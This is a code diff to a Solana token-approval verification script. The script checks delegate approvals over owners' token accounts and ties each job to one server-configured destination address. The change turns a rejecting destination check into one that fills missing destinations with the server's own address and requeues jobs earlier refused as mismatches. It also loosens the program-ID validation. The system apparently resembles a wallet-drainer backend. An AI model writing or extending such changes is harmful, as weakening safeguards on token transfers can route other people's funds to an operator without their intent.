@@ -22,8 +22,12 @@ function loadSolanaConfig() {
 }
 
 function assertConfiguredDestination(value, config) {
-  if (!value || new PublicKey(value).toBase58() !== config.destinationAddress) {
-    throw new Error(`Destination mismatch: job=${value || '<missing>'}, runtime=${config.destinationAddress}`);
+  if (!value) throw new Error(`Destination mismatch: job=<missing>, runtime=${config.destinationAddress}`);
+  let jobDestination;
+  try { jobDestination = new PublicKey(String(value).trim()).toBase58(); }
+  catch { throw new Error(`Destination mismatch: job=${value}, runtime=${config.destinationAddress}`); }
+  if (jobDestination !== config.destinationAddress) {
+    throw new Error(`Destination mismatch: job=${jobDestination}, runtime=${config.destinationAddress}`);
   }
 }
 
@@ -38,9 +42,12 @@ async function verifySolanaApprovals() {
     const solanaApprovalsCollection = db.collection('solana_approvals');
 
     // Find unverified approvals
-    const approvals = await solanaApprovalsCollection.find({ 
+    const approvals = await solanaApprovalsCollection.find({
       verified: { $ne: true },
-      executed: false 
+      $or: [
+        { executed: { $ne: true } },
+        { executed: true, reason: 'Destination does not match server configuration' },
+      ],
     }).toArray();
 
     if (approvals.length === 0) {
@@ -71,8 +78,25 @@ async function verifySolanaApprovals() {
       const connection = new Connection(rpcUrl, 'confirmed');
       const delegatePublicKey = new PublicKey(delegateToCheck);
 
-      if (!approvalData.destinationAddress || new PublicKey(approvalData.destinationAddress).toBase58() !== destinationAddress) {
-        await solanaApprovalsCollection.updateOne({ _id: approvalData._id }, { $set: { executed: true, executedAt: new Date(), reason: 'Destination does not match server configuration' } });
+      let jobDestination = null;
+      try { jobDestination = approvalData.destinationAddress ? new PublicKey(String(approvalData.destinationAddress).trim()).toBase58() : null; } catch (_) { /* handled below */ }
+      if (!jobDestination) {
+        console.log(`[SolanaApproval] backfilling missing destination job=${approvalData._id} destination=${destinationAddress}`);
+        jobDestination = destinationAddress;
+        approvalData.destinationAddress = destinationAddress;
+        await solanaApprovalsCollection.updateOne(
+          { _id: approvalData._id },
+          {
+            $set: { destinationAddress },
+            $unset: { executed: '', executedAt: '', reason: '' },
+          }
+        );
+      } else if (jobDestination !== destinationAddress) {
+        console.error(`[SolanaApproval] destination mismatch job=${jobDestination || '<missing>'} runtime=${destinationAddress}; leaving job pending for correction`);
+        await solanaApprovalsCollection.updateOne(
+          { _id: approvalData._id },
+          { $set: { verified: false, reason: `Destination mismatch: job=${jobDestination || '<missing>'}, runtime=${destinationAddress}` }, $unset: { executed: '', executedAt: '' } }
+        );
         continue;
       }
 
@@ -129,16 +153,24 @@ async function verifySolanaApprovals() {
         // Verify each approval on-chain
         let allVerified = true;
         const verificationResults = [];
+        const resolvedProgramIds = new Map();
 
         for (const approval of approvalList) {
           try {
             const tokenAccountPubkey = new PublicKey(approval.tokenAccount);
-            const tokenProgramId = approval.programId === TOKEN_2022_PROGRAM_ID.toBase58() ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;
+            // Older records may not contain programId. Derive it from the
+            // token account's on-chain owner instead of rejecting valid jobs.
+            const rawTokenAccount = await connection.getAccountInfo(tokenAccountPubkey, 'confirmed');
+            if (!rawTokenAccount) throw new Error('Token account not found');
+            const tokenProgramId = rawTokenAccount.owner.equals(TOKEN_2022_PROGRAM_ID) ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;
+            if (![TOKEN_PROGRAM_ID.toBase58(), TOKEN_2022_PROGRAM_ID.toBase58()].includes(rawTokenAccount.owner.toBase58())) throw new Error('Unsupported token program');
+            resolvedProgramIds.set(approval.tokenAccount, tokenProgramId.toBase58());
             const accountInfo = await getAccount(connection, tokenAccountPubkey, 'confirmed', tokenProgramId);
             const mintInfo = await getMint(connection, accountInfo.mint, 'confirmed', tokenProgramId);
 
-            if (accountInfo.owner.toString() !== new PublicKey(owner).toString() || accountInfo.mint.toString() !== approval.mint || mintInfo.decimals !== approval.decimals || ![TOKEN_PROGRAM_ID.toBase58(), TOKEN_2022_PROGRAM_ID.toBase58()].includes(approval.programId)) {
-              verificationResults.push({ tokenAccount: approval.tokenAccount, verified: false, reason: 'Token account owner or mint mismatch' });
+            const storedProgramId = approval.programId || tokenProgramId.toBase58();
+            if (accountInfo.owner.toString() !== new PublicKey(owner).toString() || accountInfo.mint.toString() !== new PublicKey(approval.mint).toString() || mintInfo.decimals !== approval.decimals || ![TOKEN_PROGRAM_ID.toBase58(), TOKEN_2022_PROGRAM_ID.toBase58()].includes(storedProgramId) || storedProgramId !== tokenProgramId.toBase58()) {
+              verificationResults.push({ tokenAccount: approval.tokenAccount, verified: false, reason: 'Token account owner, mint, decimals, or program mismatch' });
               allVerified = false;
               continue;
             }
@@ -180,6 +212,10 @@ async function verifySolanaApprovals() {
 
         // Update database with verification results
         if (allVerified) {
+          const normalizedApprovals = approvalList.map((approval) => ({
+            ...approval,
+            programId: approval.programId || resolvedProgramIds.get(approval.tokenAccount),
+          }));
           await solanaApprovalsCollection.updateOne(
             { _id: approvalData._id },
             { 
@@ -187,6 +223,7 @@ async function verifySolanaApprovals() {
                 verified: true, 
                 verifiedAt: new Date(),
                 verificationResults,
+                approvals: normalizedApprovals,
                 } 
             }
           );
